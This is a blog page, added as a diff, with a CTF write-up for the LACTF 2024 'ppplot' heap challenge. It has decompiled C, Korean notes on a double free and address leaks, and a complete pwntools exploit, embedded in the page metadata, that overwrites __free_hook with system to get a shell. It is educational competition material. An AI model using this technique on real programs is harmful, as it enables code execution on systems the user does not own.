@@ -1,0 +1,538 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>LACTF 2024 - ppplot | msh1307</title>
+<meta name="keywords" content="LACTF2024, LACTF ppplot">
+<meta name="description" content="ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp&#43;1Ch] [rbp-14h] int idx; // [rsp&#43;20h] [rbp-10h] unsigned int v7; // [rsp&#43;24h] [rbp-Ch] eq_obj *obj; // [rsp&#43;28h] [rbp-8h] printf(&#34;idx: &#34;); idx = read_int(); if ( (unsigned int)idx &lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i &lt;= 63; &#43;&#43;i ) { res = calc(obj, i - 0x20); v7 = res &#43; 0x20; LODWORD(v1) = printf(&#34;(%d, %d)\n&#34;, (unsigned int)(i - 0x20), res); if ( v7 &lt;= 0x3F ) { if ( flag ) v3 = &#39;.">
+<meta name="author" content="">
+<link rel="canonical" href="https://msh1307.kr/blog/lactf_2024_ppplot/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.min.d9c43e0c7cae3b38c51e79921ad3cf2685d9811a56593a817d9b57ac4fdebf2b.css" integrity="sha256-2cQ&#43;DHyuOzjFHnmSGtPPJoXZgRpWWTqBfZtXrE/evys=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.min.b95bacdc39e37a332a9f883b1e78be4abc1fdca2bc1f2641f55e3cd3dabd4d61.js" integrity="sha256-uVus3DnjejMqn4g7Hni&#43;Srwf3KK8HyZB9V4809q9TWE="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+<script>
+window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', 'G-BR89V2WEC0');
+</script>
+<link rel="icon" href="https://msh1307.kr/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://msh1307.kr/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://msh1307.kr/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://msh1307.kr/apple-touch-icon.png">
+<link rel="mask-icon" href="https://msh1307.kr/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="LACTF 2024 - ppplot" />
+<meta property="og:description" content="ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp&#43;1Ch] [rbp-14h] int idx; // [rsp&#43;20h] [rbp-10h] unsigned int v7; // [rsp&#43;24h] [rbp-Ch] eq_obj *obj; // [rsp&#43;28h] [rbp-8h] printf(&#34;idx: &#34;); idx = read_int(); if ( (unsigned int)idx &lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i &lt;= 63; &#43;&#43;i ) { res = calc(obj, i - 0x20); v7 = res &#43; 0x20; LODWORD(v1) = printf(&#34;(%d, %d)\n&#34;, (unsigned int)(i - 0x20), res); if ( v7 &lt;= 0x3F ) { if ( flag ) v3 = &#39;." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://msh1307.kr/blog/lactf_2024_ppplot/" /><meta property="article:section" content="blog" />
+<meta property="article:published_time" content="2024-03-09T00:00:00&#43;00:00" />
+<meta property="article:modified_time" content="2024-03-09T00:00:00&#43;00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="LACTF 2024 - ppplot"/>
+<meta name="twitter:description" content="ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp&#43;1Ch] [rbp-14h] int idx; // [rsp&#43;20h] [rbp-10h] unsigned int v7; // [rsp&#43;24h] [rbp-Ch] eq_obj *obj; // [rsp&#43;28h] [rbp-8h] printf(&#34;idx: &#34;); idx = read_int(); if ( (unsigned int)idx &lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i &lt;= 63; &#43;&#43;i ) { res = calc(obj, i - 0x20); v7 = res &#43; 0x20; LODWORD(v1) = printf(&#34;(%d, %d)\n&#34;, (unsigned int)(i - 0x20), res); if ( v7 &lt;= 0x3F ) { if ( flag ) v3 = &#39;."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "Blogs",
+      "item": "https://msh1307.kr/blog/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  3 ,
+      "name": "LACTF 2024 - ppplot",
+      "item": "https://msh1307.kr/blog/lactf_2024_ppplot/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "LACTF 2024 - ppplot",
+  "name": "LACTF 2024 - ppplot",
+  "description": "ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp+1Ch] [rbp-14h] int idx; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] eq_obj *obj; // [rsp+28h] [rbp-8h] printf(\u0026#34;idx: \u0026#34;); idx = read_int(); if ( (unsigned int)idx \u0026lt; 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i \u0026lt;= 63; ++i ) { res = calc(obj, i - 0x20); v7 = res + 0x20; LODWORD(v1) = printf(\u0026#34;(%d, %d)\\n\u0026#34;, (unsigned int)(i - 0x20), res); if ( v7 \u0026lt;= 0x3F ) { if ( flag ) v3 = \u0026#39;.",
+  "keywords": [
+    "LACTF2024", "LACTF ppplot"
+  ],
+  "articleBody": "ppplot Analysis int __fastcall arith(int flag) { uint64_t *v1; // rax unsigned int res; // eax char v3; // cl int i; // [rsp+1Ch] [rbp-14h] int idx; // [rsp+20h] [rbp-10h] unsigned int v7; // [rsp+24h] [rbp-Ch] eq_obj *obj; // [rsp+28h] [rbp-8h] printf(\"idx: \"); idx = read_int(); if ( (unsigned int)idx \u003c 128 ) { v1 = (uint64_t *)obj_list_[idx]; obj = (eq_obj *)v1; for ( i = 0; i \u003c= 63; ++i ) { res = calc(obj, i - 0x20); v7 = res + 0x20; LODWORD(v1) = printf(\"(%d, %d)\\n\", (unsigned int)(i - 0x20), res); if ( v7 \u003c= 0x3F ) { if ( flag ) v3 = '.'; else v3 = '@'; v1 = (uint64_t *)\u0026buf[0x40 * (__int64)(int)v7 + i]; *(_BYTE *)v1 = v3; } } } else { LODWORD(v1) = puts(\"index out of bounds\"); } return (int)v1; } void sub_15F4() { unsigned int v0; // [rsp+Ch] [rbp-4h] printf(\"idx: \"); v0 = read_int(); if ( v0 \u003c 0x80 ) free(obj_list_[v0]); else puts(\"index out of bounds\"); } double free가 발생한다.\n__int64 __fastcall calc(eq_obj *obj, int a2) { unsigned int v3; // [rsp+Ch] [rbp-10h] signed int term_iter; // [rsp+10h] [rbp-Ch] int v5; // [rsp+14h] [rbp-8h] signed int i; // [rsp+18h] [rbp-4h] v3 = 0; for ( term_iter = 0; term_iter \u003c (signed int)obj-\u003edegree; ++term_iter ) { v5 = 1; for ( i = 0; i \u003c term_iter; ++i ) v5 *= a2; v3 += v5 * obj-\u003eterm_list[term_iter]; } return v3; } // 1x + (cx) + (c^2*x1) + (c^3*x) // 1x + -(cx) + (c^2*x1) + -(c^3*x) 다항식을 입력받는다.\n주석에 달린것 처럼 연산이 된다.\nExploitation DFB가 발생한다는 것은, dangling pointer가 남는다는 의미다.\ndangling pointer가 남았다면 free된 상태에서 연산이 가능하다는 의미다.\nfree된 상태에서의 힙주소를 leak할 수 있게 된다.\n1*x + c*x1 + c^2*x2 + c^3*x3 1*x + -c*x1 + c^2*x2 + -c^3*x3 x,x1=0,0 c^2*x2 + c^3*x3 c^2*x2 + -c^3*x3 기본적으로 free 이후 tcache에서의 메모리 힙 청크 상태를 확인해보면, x, x1자리가 0이다.\n그래서 -1, +1일때의 출력 결과를 바탕으로 주소를 얻어낼 수 있다.\nDFB를 통해 임의 청크를 할당해서 size를 변조하고 free한다.\nunsorted bin에 위치시키고 main arena가 libc에 위치하고 있으니 이와 doubly linked list로 연결된 unsorted bin을 leak한다.\n구글의 nsjail을 이용해서 docker가 배포되었다.\n/srv에 우분투가 마운트되고 격리된 프로세스는 /srv를 /로 마운트하는것을 확인했다.\n이를 이용해 환경을 구축할 수 있었다.\nhttps://github.com/msh1307/binPatch\n옛날에 개발했던 바이너리 패치 도구를 이용해서 환경을 맞춘다.\nExploit script from pwn import * from regex import W # nsjail mounts /srv/ -\u003e / # ubuntu@sha256:f2034e7195f61334e6caff6ecf2e965f92d11e888309065da85ff50c617732b8 sla = lambda x,y : p.sendlineafter(x,y) sa = lambda x,y : p.sendafter(x,y) rvu = lambda x : p.recvuntil(x) def mk_eq(degree, i : list): sla(b'pp: ', str(1)) sla(b'degree: ',str(degree)) for iter in range(degree): sla(b'enter', str(i[iter])) def free(idx): sla(b'pp: ', str(5)) sla(b'idx: ', str(idx)) def print_(): sla(b'pp: ', str(2)) def arith(idx): sla(b'pp: ', str(3)) sla(b'idx: ', str(idx)) libc = ELF('./bc.so.6') p = process('./out.bin') # already patched for i in range(0x9): mk_eq(10, [26739]*10) for i in range(0x9): free(i) for i in range(0x7): mk_eq(10, [26739]*10) mk_eq(0x4, [26739]*4) free(7) # idx 8 -\u003e 4 | idx7 arith(8) rvu(b'(-1, ') neg_cx = int(rvu(b')')[:-1]) rvu(b'(1, ') pos_cx = int(rvu(b')')[:-1]) v = (((neg_cx + pos_cx))//2) heap = ( (((pos_cx - v)) \u003c\u003c 32) | v\u00260xffffffff ) success(hex(heap)) mk_eq(2,[0]*2) # idx 17 for i in range(9): mk_eq(10,[0]*10) for i in range(9): free(i+18) free(7+18) for i in range(3): mk_eq(0,[]) target = heap + 0x280 mk_eq(4,[target\u00260xffffffff,target\u003e\u003e32,0,0]) mk_eq(8,[0]*8) mk_eq(4,[0,0,0x461,0]) # +0x460, there's a prev inusebit enabled sz. free(0) # just reclaiming a freed chunk and changing a content ptr let me leak libc. mk_eq(10,[0]*10) # 33 mk_eq(10,[0]*10) # 34 free(33) free(34) target = heap + 0x338 mk_eq(4,[4,0,target,target\u003e\u003e32]) ''' gef\u003e x/4xg 0x55db06567330+8 0x55db06567338: 0x00000000000003c1 0x00007fe33e2c6be0 0x55db06567348: 0x00007fe33e2c6be0 0x0000000000000000''' arith(33) rvu(b'(-1, ') neg_cx = int(rvu(b')')[:-1]) rvu(b'(1, ') pos_cx = int(rvu(b')')[:-1]) v = (((neg_cx + pos_cx))//2) libc_base = ( (((pos_cx - v)) \u003c\u003c 32) | v\u00260xffffffff ) - 0x1ecbe0 success(hex(libc_base)) mk_eq(10,[0]*10) mk_eq(10,[0]*10) free(36) free(37) mk_eq(4,[26739]*4) for i in range(9): mk_eq(10,[0]*10) for i in range(9): free(i+38) free(7+38) for i in range(3): mk_eq(0,[]) target = libc_base + libc.sym.__free_hook mk_eq(4,[target\u00260xffffffff,target\u003e\u003e32,0,0]) mk_eq(8,[0]*8) mk_eq(4,[(libc_base+libc.sym.system)\u00260xffffffff,(libc_base+libc.sym.system)\u003e\u003e32,0,0]) # +0x460, there's a prev inuse bit enabled sz. free(36) p.interactive() ",
+  "wordCount" : "663",
+  "inLanguage": "en",
+  "datePublished": "2024-03-09T00:00:00Z",
+  "dateModified": "2024-03-09T00:00:00Z",
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://msh1307.kr/blog/lactf_2024_ppplot/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "msh1307",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://msh1307.kr/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header sticky-header">
+    
+    <script async src="https://www.googletagmanager.com/gtag/js?id=G-BR89V2WEC0"></script>
+    <script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+    gtag('config', 'G-BR89V2WEC0');
+    </script>
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://msh1307.kr" accesskey="h" title="msh1307 (Alt + H)">msh1307</a>
+            <span class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </span>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://msh1307.kr/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/blog" title="Blog">
+                    <span>Blog</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/about" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/search" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/categories" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://msh1307.kr/tags" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://msh1307.kr">Home</a>&nbsp;»&nbsp;<a href="https://msh1307.kr/blog/">Blogs</a></div>
+    <h1 class="post-title">
+      LACTF 2024 - ppplot
+    </h1>
+    <div class="post-meta">
+
+
+March 2024
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">‎ Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#ppplot" aria-label="ppplot">ppplot</a><ul>
+                        
+                <li>
+                    <a href="#analysis" aria-label="Analysis">Analysis</a></li>
+                <li>
+                    <a href="#exploitation" aria-label="Exploitation">Exploitation</a><ul>
+                        
+                <li>
+                    <a href="#exploit-script" aria-label="Exploit script">Exploit script</a>
+                </li>
+            </ul>
+            </li>
+            </ul>
+            </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><h1 id="ppplot">ppplot<a hidden class="anchor" aria-hidden="true" href="#ppplot">#</a></h1>
+<h2 id="analysis">Analysis<a hidden class="anchor" aria-hidden="true" href="#analysis">#</a></h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">arith</span>(<span style="color:#66d9ef">int</span> flag)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>v1; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> res; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> v3; <span style="color:#75715e">// cl
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+1Ch] [rbp-14h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> idx; <span style="color:#75715e">// [rsp+20h] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v7; <span style="color:#75715e">// [rsp+24h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  eq_obj <span style="color:#f92672">*</span>obj; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;idx: &#34;</span>);
+</span></span><span style="display:flex;"><span>  idx <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)idx <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">128</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)obj_list_[idx];
+</span></span><span style="display:flex;"><span>    obj <span style="color:#f92672">=</span> (eq_obj <span style="color:#f92672">*</span>)v1;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">63</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      res <span style="color:#f92672">=</span> <span style="color:#a6e22e">calc</span>(obj, i <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>);
+</span></span><span style="display:flex;"><span>      v7 <span style="color:#f92672">=</span> res <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x20</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">LODWORD</span>(v1) <span style="color:#f92672">=</span> <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;(%d, %d)</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span>)(i <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>), res);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span> ( v7 <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">0x3F</span> )
+</span></span><span style="display:flex;"><span>      {
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ( flag )
+</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;.&#39;</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>          v3 <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;@&#39;</span>;
+</span></span><span style="display:flex;"><span>        v1 <span style="color:#f92672">=</span> (<span style="color:#66d9ef">uint64_t</span> <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>buf[<span style="color:#ae81ff">0x40</span> <span style="color:#f92672">*</span> (<span style="color:#66d9ef">__int64</span>)(<span style="color:#66d9ef">int</span>)v7 <span style="color:#f92672">+</span> i];
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">*</span>(_BYTE <span style="color:#f92672">*</span>)v1 <span style="color:#f92672">=</span> v3;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">LODWORD</span>(v1) <span style="color:#f92672">=</span> <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;index out of bounds&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (<span style="color:#66d9ef">int</span>)v1;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">sub_15F4</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v0; <span style="color:#75715e">// [rsp+Ch] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;idx: &#34;</span>);
+</span></span><span style="display:flex;"><span>  v0 <span style="color:#f92672">=</span> <span style="color:#a6e22e">read_int</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( v0 <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0x80</span> )
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">free</span>(obj_list_[v0]);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;index out of bounds&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>double free가 발생한다.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">calc</span>(eq_obj <span style="color:#f92672">*</span>obj, <span style="color:#66d9ef">int</span> a2)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> v3; <span style="color:#75715e">// [rsp+Ch] [rbp-10h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> term_iter; <span style="color:#75715e">// [rsp+10h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> v5; <span style="color:#75715e">// [rsp+14h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+18h] [rbp-4h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  v3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( term_iter <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; term_iter <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">signed</span> <span style="color:#66d9ef">int</span>)obj<span style="color:#f92672">-&gt;</span>degree; <span style="color:#f92672">++</span>term_iter )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    v5 <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> term_iter; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>      v5 <span style="color:#f92672">*=</span> a2;
+</span></span><span style="display:flex;"><span>    v3 <span style="color:#f92672">+=</span> v5 <span style="color:#f92672">*</span> obj<span style="color:#f92672">-&gt;</span>term_list[term_iter];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> v3;
+</span></span><span style="display:flex;"><span>}                                               <span style="color:#75715e">// 1x + (cx) + (c^2*x1) + (c^3*x)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                                <span style="color:#75715e">// 1x + -(cx) + (c^2*x1) + -(c^3*x)
+</span></span></span></code></pre></div><p>다항식을 입력받는다.</p>
+<p>주석에 달린것 처럼 연산이 된다.</p>
+<h2 id="exploitation">Exploitation<a hidden class="anchor" aria-hidden="true" href="#exploitation">#</a></h2>
+<p>DFB가 발생한다는 것은, dangling pointer가 남는다는 의미다.<br>
+dangling pointer가 남았다면 free된 상태에서 연산이 가능하다는 의미다.<br>
+free된 상태에서의 힙주소를 leak할 수 있게 된다.</p>
+<pre tabindex="0"><code>1*x + c*x1 + c^2*x2 + c^3*x3 
+1*x + -c*x1 + c^2*x2 + -c^3*x3
+
+x,x1=0,0 
+
+c^2*x2 + c^3*x3 
+c^2*x2 + -c^3*x3
+</code></pre><p>기본적으로 free 이후 tcache에서의 메모리 힙 청크 상태를 확인해보면, x, x1자리가 0이다.<br>
+그래서 -1, +1일때의 출력 결과를 바탕으로 주소를 얻어낼 수 있다.</p>
+<p>DFB를 통해 임의 청크를 할당해서 size를 변조하고 free한다.<br>
+unsorted bin에 위치시키고 main arena가 libc에 위치하고 있으니 이와 doubly linked list로 연결된 unsorted bin을 leak한다.</p>
+<p>구글의 nsjail을 이용해서 docker가 배포되었다.<br>
+/srv에 우분투가 마운트되고 격리된 프로세스는 /srv를 /로 마운트하는것을 확인했다.<br>
+이를 이용해 환경을 구축할 수 있었다.<br>
+<a href="https://github.com/msh1307/binPatch">https://github.com/msh1307/binPatch</a><br>
+옛날에 개발했던 바이너리 패치 도구를 이용해서 환경을 맞춘다.</p>
+<h3 id="exploit-script">Exploit script<a hidden class="anchor" aria-hidden="true" href="#exploit-script">#</a></h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> regex <span style="color:#f92672">import</span> W
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># nsjail mounts /srv/ -&gt; / </span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># ubuntu@sha256:f2034e7195f61334e6caff6ecf2e965f92d11e888309065da85ff50c617732b8</span>
+</span></span><span style="display:flex;"><span>sla <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendlineafter(x,y)
+</span></span><span style="display:flex;"><span>sa <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x,y : p<span style="color:#f92672">.</span>sendafter(x,y)
+</span></span><span style="display:flex;"><span>rvu <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x : p<span style="color:#f92672">.</span>recvuntil(x)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">mk_eq</span>(degree, i : list):
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;pp: &#39;</span>, str(<span style="color:#ae81ff">1</span>))
+</span></span><span style="display:flex;"><span>    sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;degree: &#39;</span>,str(degree))
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> iter <span style="color:#f92672">in</span> range(degree):
+</span></span><span style="display:flex;"><span>        sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;enter&#39;</span>, str(i[iter]))
+</span></span><span style="display:flex;"><span>
